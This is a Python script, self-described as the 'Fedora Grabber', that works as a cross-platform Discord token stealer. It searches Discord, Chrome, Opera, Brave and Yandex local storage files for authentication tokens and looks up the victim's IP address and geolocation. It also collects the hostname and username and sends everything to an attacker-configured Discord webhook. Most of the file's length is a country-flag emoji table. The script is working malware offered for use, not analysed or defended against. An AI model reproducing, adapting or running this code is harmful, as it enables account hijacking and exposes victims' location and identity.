#!/usr/bin/python3

WEBHOOK_URL = 'Тут будет вебхук URL'

from platform import system


def find_tokens(path):
    path += '/Local Storage/leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}/{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def search_tokens(ping_me_on_find_token = False, *any: any):

    # Token grabber for Linux by
    # https://github.com/wodxgod/Discord-Token-Grabber/pull/45#issuecomment-998310212

    if ping_me_on_find_token != True:
        ping_me_on_find_token = False
    else:
        ping_me_on_find_token = True
    ping = ping_me_on_find_token
    config = os.path.expanduser('~/.config')
    flatpak = os.path.expanduser('~/.var/app')
    get_os = str(system()).lower()

    if get_os == 'linux':
        paths = {
            'Discord': config + '/discord',
            'Discord (Flatpak)': flatpak + '/com.discordapp.Discord/config/discord',
            'Discord Canary': config + '/discordcanary',
            'Discord PTB': config + '/discordptb',
            'Google Chrome': config + '/google-chrome/Default'
        }
    elif get_os == 'darwin':
        paths = {
            'Discord': '~/Library/Application Support/Discord',
            'Google Chrome': '~/Library/Application Support/Google Chrome'
        }
    elif get_os == 'windows':

        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')

        paths = {
            'Discord': roaming + '/Discord',
            'Discord Canary': roaming + '/discordcanary',
            'Discord PTB': roaming + '/discordptb',
            'Google Chrome': local + '/Google/Chrome/User Data/Default',
            'Opera': roaming + '/Opera Software/Opera Stable',
            'Brave': local + '/BraveSoftware/Brave-Browser/User Data/Default',
            'Yandex': local + '/Yandex/YandexBrowser/User Data/Default'
        }
    message = '@everyone' if ping else ''
    try:
        for platform, path in paths.items():
            if not os.path.exists(path):
                continue
            message += f'\n`{str(platform)}` - '

            tokens = find_tokens(path)
            if len(tokens) > 0:
                for token in tokens:
                    message += f'||**{str(token)}**||\n'
            else:
                message += '||**Not found.**||\n'
    except BaseException:
        pass
    return message

def get_country_flag_emoji(country_code: str, *any: any):
    emoji = None
    country_code = str(country_code).upper()
    if country_code =='AD': return '🇦🇩';
    elif country_code =='AE': return '🇦🇪';
    elif country_code =='AF': return '🇦🇫';
    elif country_code =='AG': return '🇦🇬';
    elif country_code =='AI': return '🇦🇮';
    elif country_code =='AL': return '🇦🇱';
    elif country_code =='AM': return '🇦🇲';
    elif country_code =='AO': return '🇦🇴';
    elif country_code =='AQ': return '🇦🇶';
    elif country_code =='AR': return '🇦🇷';
    elif country_code =='AS': return '🇦🇸';
    elif country_code =='AT': return '🇦🇹';
    elif country_code =='AU': return '🇦🇺';
    elif country_code =='AW': return '🇦🇼';
    elif country_code =='AX': return '🇦🇽';
    elif country_code =='AZ': return '🇦🇿';
    elif country_code =='BA': return '🇧🇦';
    elif country_code =='BB': return '🇧🇧';
    elif country_code =='BD': return '🇧🇩';
    elif country_code =='BE': return '🇧🇪';
    elif country_code =='BF': return '🇧🇫';
    elif country_code =='BG': return '🇧🇬';
    elif country_code =='BH': return '🇧🇭';
    elif country_code =='BI': return '🇧🇮';
    elif country_code =='BJ': return '🇧🇯';
    elif country_code =='BL': return '🇧🇱';
    elif country_code =='BM': return '🇧🇲';
    elif country_code =='BN': return '🇧🇳';
    elif country_code =='BO': return '🇧🇴';
    elif country_code =='BQ': return '🇧🇶';
    elif country_code =='BR': return '🇧🇷';
    elif country_code =='BS': return '🇧🇸';
    elif country_code =='BT': return '🇧🇹';
    elif country_code =='BV': return '🇧🇻';
    elif country_code =='BW': return '🇧🇼';
    elif country_code =='BY': return '🇧🇾';
    elif country_code =='BZ': return '🇧🇿';
    elif country_code =='CA': return '🇨🇦';
    elif country_code =='CC': return '🇨🇨';
    elif country_code =='CD': return '🇨🇩';
    elif country_code =='CF': return '🇨🇫';
    elif country_code =='CG': return '🇨🇬';
    elif country_code =='CH': return '🇨🇭';
    elif country_code =='CI': return '🇨🇮';
    elif country_code =='CK': return '🇨🇰';
    elif country_code =='CL': return '🇨🇱';
    elif country_code =='CM': return '🇨🇲';
    elif country_code =='CN': return '🇨🇳';
    elif country_code =='CO': return '🇨🇴';
    elif country_code =='CR': return '🇨🇷';
    elif country_code =='CU': return '🇨🇺';
    elif country_code =='CV': return '🇨🇻';
    elif country_code =='CW': return '🇨🇼';
    elif country_code =='CX': return '🇨🇽';
    elif country_code =='CY': return '🇨🇾';
    elif country_code =='CZ': return '🇨🇿';
    elif country_code =='DE': return '🇩🇪';
    elif country_code =='DJ': return '🇩🇯';
    elif country_code =='DK': return '🇩🇰';
    elif country_code =='DM': return '🇩🇲';
    elif country_code =='DO': return '🇩🇴';
    elif country_code =='DZ': return '🇩🇿';
    elif country_code =='EC': return '🇪🇨';
    elif country_code =='EE': return '🇪🇪';
    elif country_code =='EG': return '🇪🇬';
    elif country_code =='EH': return '🇪🇭';
    elif country_code =='ER': return '🇪🇷';
    elif country_code =='ES': return '🇪🇸';
    elif country_code =='ET': return '🇪🇹';
    elif country_code =='FI': return '🇫🇮';
    elif country_code =='FJ': return '🇫🇯';
    elif country_code =='FK': return '🇫🇰';
    elif country_code =='FM': return '🇫🇲';
    elif country_code =='FO': return '🇫🇴';
    elif country_code =='FR': return '🇫🇷';
    elif country_code =='GA': return '🇬🇦';
    elif country_code =='GB': return '🇬🇧';
    elif country_code =='GD': return '🇬🇩';
    elif country_code =='GE': return '🇬🇪';
    elif country_code =='GF': return '🇬🇫';
    elif country_code =='GG': return '🇬🇬';
    elif country_code =='GH': return '🇬🇭';
    elif country_code =='GI': return '🇬🇮';
    elif country_code =='GL': return '🇬🇱';
    elif country_code =='GM': return '🇬🇲';
    elif country_code =='GN': return '🇬🇳';
    elif country_code =='GP': return '🇬🇵';
    elif country_code =='GQ': return '🇬🇶';
    elif country_code =='GR': return '🇬🇷';
    elif country_code =='GS': return '🇬🇸';
    elif country_code =='GT': return '🇬🇹';
    elif country_code =='GU': return '🇬🇺';
    elif country_code =='GW': return '🇬🇼';
    elif country_code =='GY': return '🇬🇾';
    elif country_code =='HK': return '🇭🇰';
    elif country_code =='HM': return '🇭🇲';
    elif country_code =='HN': return '🇭🇳';
    elif country_code =='HR': return '🇭🇷';
    elif country_code =='HT': return '🇭🇹';
    elif country_code =='HU': return '🇭🇺';
    elif country_code =='ID': return '🇮🇩';
    elif country_code =='IE': return '🇮🇪';
    elif country_code =='IL': return '🇮🇱';
    elif country_code =='IM': return '🇮🇲';
    elif country_code =='IN': return '🇮🇳';
    elif country_code =='IO': return '🇮🇴';
    elif country_code =='IQ': return '🇮🇶';
    elif country_code =='IR': return '🇮🇷';
    elif country_code =='IS': return '🇮🇸';
    elif country_code =='IT': return '🇮🇹';
    elif country_code =='JE': return '🇯🇪';
    elif country_code =='JM': return '🇯🇲';
    elif country_code =='JO': return '🇯🇴';
    elif country_code =='JP': return '🇯🇵';
    elif country_code =='KE': return '🇰🇪';
    elif country_code =='KG': return '🇰🇬';
    elif country_code =='KH': return '🇰🇭';
    elif country_code =='KI': return '🇰🇮';
    elif country_code =='KM': return '🇰🇲';
    elif country_code =='KN': return '🇰🇳';
    elif country_code =='KP': return '🇰🇵';
    elif country_code =='KR': return '🇰🇷';
    elif country_code =='KW': return '🇰🇼';
    elif country_code =='KY': return '🇰🇾';
    elif country_code =='KZ': return '🇰🇿';
    elif country_code =='LA': return '🇱🇦';
    elif country_code =='LB': return '🇱🇧';
    elif country_code =='LC': return '🇱🇨';
    elif country_code =='LI': return '🇱🇮';
    elif country_code =='LK': return '🇱🇰';
    elif country_code =='LR': return '🇱🇷';
    elif country_code =='LS': return '🇱🇸';
    elif country_code =='LT': return '🇱🇹';
    elif country_code =='LU': return '🇱🇺';
    elif country_code =='LV': return '🇱🇻';
    elif country_code =='LY': return '🇱🇾';
    elif country_code =='MA': return '🇲🇦';
    elif country_code =='MC': return '🇲🇨';
    elif country_code =='MD': return '🇲🇩';
    elif country_code =='ME': return '🇲🇪';
    elif country_code =='MF': return '🇲🇫';
    elif country_code =='MG': return '🇲🇬';
    elif country_code =='MH': return '🇲🇭';
    elif country_code =='MK': return '🇲🇰';
    elif country_code =='ML': return '🇲🇱';
    elif country_code =='MM': return '🇲🇲';
    elif country_code =='MN': return '🇲🇳';
    elif country_code =='MO': return '🇲🇴';
    elif country_code =='MP': return '🇲🇵';
    elif country_code =='MQ': return '🇲🇶';
    elif country_code =='MR': return '🇲🇷';
    elif country_code =='MS': return '🇲🇸';
    elif country_code =='MT': return '🇲🇹';
    elif country_code =='MU': return '🇲🇺';
    elif country_code =='MV': return '🇲🇻';
    elif country_code =='MW': return '🇲🇼';
    elif country_code =='MX': return '🇲🇽';
    elif country_code =='MY': return '🇲🇾';
    elif country_code =='MZ': return '🇲🇿';
    elif country_code =='NA': return '🇳🇦';
    elif country_code =='NC': return '🇳🇨';
    elif country_code =='NE': return '🇳🇪';
    elif country_code =='NF': return '🇳🇫';
    elif country_code =='NG': return '🇳🇬';
    elif country_code =='NI': return '🇳🇮';
    elif country_code =='NL': return '🇳🇱';
    elif country_code =='NO': return '🇳🇴';
    elif country_code =='NP': return '🇳🇵';
    elif country_code =='NR': return '🇳🇷';
    elif country_code =='NU': return '🇳🇺';
    elif country_code =='NZ': return '🇳🇿';
    elif country_code =='OM': return '🇴🇲';
    elif country_code =='PA': return '🇵🇦';
    elif country_code =='PE': return '🇵🇪';
    elif country_code =='PF': return '🇵🇫';
    elif country_code =='PG': return '🇵🇬';
    elif country_code =='PH': return '🇵🇭';
    elif country_code =='PK': return '🇵🇰';
    elif country_code =='PL': return '🇵🇱';
    elif country_code =='PM': return '🇵🇲';
    elif country_code =='PN': return '🇵🇳';
    elif country_code =='PR': return '🇵🇷';
    elif country_code =='PS': return '🇵🇸';
    elif country_code =='PT': return '🇵🇹';
    elif country_code =='PW': return '🇵🇼';
    elif country_code =='PY': return '🇵🇾';
    elif country_code =='QA': return '🇶🇦';
    elif country_code =='RE': return '🇷🇪';
    elif country_code =='RO': return '🇷🇴';
    elif country_code =='RS': return '🇷🇸';
    elif country_code =='RU': return '🇷🇺';
    elif country_code =='RW': return '🇷🇼';
    elif country_code =='SA': return '🇸🇦';
    elif country_code =='SB': return '🇸🇧';
    elif country_code =='SC': return '🇸🇨';
    elif country_code =='SD': return '🇸🇩';
    elif country_code =='SE': return '🇸🇪';
    elif country_code =='SG': return '🇸🇬';
    elif country_code =='SH': return '🇸🇭';
    elif country_code =='SI': return '🇸🇮';
    elif country_code =='SJ': return '🇸🇯';
    elif country_code =='SK': return '🇸🇰';
    elif country_code =='SL': return '🇸🇱';
    elif country_code =='SM': return '🇸🇲';
    elif country_code =='SN': return '🇸🇳';
    elif country_code =='SO': return '🇸🇴';
    elif country_code =='SR': return '🇸🇷';
    elif country_code =='SS': return '🇸🇸';
    elif country_code =='ST': return '🇸🇹';
    elif country_code =='SV': return '🇸🇻';
    elif country_code =='SX': return '🇸🇽';
    elif country_code =='SY': return '🇸🇾';
    elif country_code =='SZ': return '🇸🇿';
    elif country_code =='TC': return '🇹🇨';
    elif country_code =='TD': return '🇹🇩';
    elif country_code =='TF': return '🇹🇫';
    elif country_code =='TG': return '🇹🇬';
    elif country_code =='TH': return '🇹🇭';
    elif country_code =='TJ': return '🇹🇯';
    elif country_code =='TK': return '🇹🇰';
    elif country_code =='TL': return '🇹🇱';
    elif country_code =='TM': return '🇹🇲';
    elif country_code =='TN': return '🇹🇳';
    elif country_code =='TO': return '🇹🇴';
    elif country_code =='TR': return '🇹🇷';
    elif country_code =='TT': return '🇹🇹';
    elif country_code =='TV': return '🇹🇻';
    elif country_code =='TW': return '🇹🇼';
    elif country_code =='TZ': return '🇹🇿';
    elif country_code =='UA': return '🇺🇦';
    elif country_code =='UG': return '🇺🇬';
    elif country_code =='UM': return '🇺🇲';
    elif country_code =='US': return '🇺🇸';
    elif country_code =='UY': return '🇺🇾';
    elif country_code =='UZ': return '🇺🇿';
    elif country_code =='VA': return '🇻🇦';
    elif country_code =='VC': return '🇻🇨';
    elif country_code =='VE': return '🇻🇪';
    elif country_code =='VG': return '🇻🇬';
    elif country_code =='VI': return '🇻🇮';
    elif country_code =='VN': return '🇻🇳';
    elif country_code =='VU': return '🇻🇺';
    elif country_code =='WF': return '🇼🇫';
    elif country_code =='WS': return '🇼🇸';
    elif country_code =='XK': return '🇽🇰';
    elif country_code =='YE': return '🇾🇪';
    elif country_code =='YT': return '🇾🇹';
    elif country_code =='ZA': return '🇿🇦';
    elif country_code == 'ZM': return '🇿🇲';
    return emoji

try:
    import re, os
    from requests import get
    from discord import Webhook, RequestsWebhookAdapter
    from platform import system as get_os
    from datetime import datetime
    from socket import gethostname
    from getpass import getuser as getusername
    now = datetime.now()
    current_time = now.strftime("%H:%M:%S")
    url = '<URL>'
    url = str(WEBHOOK_URL)

    ip = str(get('http://ipgrab.io').text).replace('\n','')
    location_data = get(f'http://ip-api.com/json/{str(ip)}').json()
    more_location_data = get(f'https://ipapi.co/{str(ip)}/json').json()
    more_location_data_2 = get(f'http://ipwhois.app/json/{str(ip)}').json()
    country = location_data['country']
    country_code = location_data['countryCode']
    city = location_data['city']
    region_name = location_data['regionName']
    zip_code = location_data['zip']
    lat = location_data['lat']
    lon = location_data['lon']
    timezone = location_data['timezone']
    country_flag = get_country_flag_emoji(country_code = country_code)
    country_calling_code = str(get('https://ipapi.co/country_calling_code').text)
    country_domain = more_location_data['country_tld']
    country_continent = more_location_data_2['continent']
    
    currency = more_location_data['currency']
    currency_name = more_location_data['currency_name']
    currency_symbol = more_location_data_2['currency_symbol']

    tokens = search_tokens()

    webhook = Webhook.from_url(str(url), adapter=RequestsWebhookAdapter())
    webhook.send(f'''
:boom: **Fedora Grabber** :boom:
*A cross platform IP, OS, etc. grabber made with Python 3.*
*By EZRAIDv2 with love :)*
**github.com/EZRAIDv2/fedora-grabber**

:map: **``Geolocation Info``** :globe_with_meridians:

`OS` - ||**{str(get_os())}**||
`IP` - ||**{str(ip)}**||
`Country` - ||**{str(country)}**||
`Country flag` - ||**{str(country_flag)}**||
`Country code` - ||**{str(country_code)}**||
`Country calling number` - ||**{str(country_calling_code)}**||
`Country domain` - ||**{str(country_domain)}**||
`Country continent` - ||**{str(country_continent)}**||
`Region` - ||**{str(region_name)}**||
`City` - ||**{str(city)}**||
`Latitudes` - ||**{str(lat)}**||
`Longitudes` - ||**{str(lon)}**||
`Timezone` - ||**{str(timezone)}**||
`ZIP Code (postal code)` - ||**{str(zip_code)}**||

:desktop: **``PC Info``** :computer:

`PC Hostname` - ||**{str(gethostname())}**||
`PC Username` - ||**{str(getusername())}**||

:clock3: **``Time Info``** :alarm_clock:

`Time` - ||**{str(current_time)}**||

:money_with_wings: **``Currency info``** :moneybag:

`Country currency` - ||**{str(currency)}**||
`Country currency (name)` - ||**{str(currency_name)}**||
`Country currency (symbol)` - ||**{str(currency_symbol)}**||

:clipboard: **`Discord tokens`** :page_facing_up:
{str(tokens)}
''')
except BaseException as e: print(e); pass
